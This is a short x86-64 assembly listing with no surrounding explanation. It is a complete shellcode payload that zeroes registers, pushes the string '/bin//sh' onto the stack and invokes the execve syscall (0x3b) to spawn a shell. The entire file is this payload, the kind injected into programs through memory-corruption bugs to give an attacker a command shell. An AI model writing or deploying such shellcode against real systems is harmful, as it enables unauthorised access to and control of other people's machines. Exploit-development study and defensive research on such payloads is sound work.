[BITS 64]

_start:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    mov al, 0x3b
    syscall
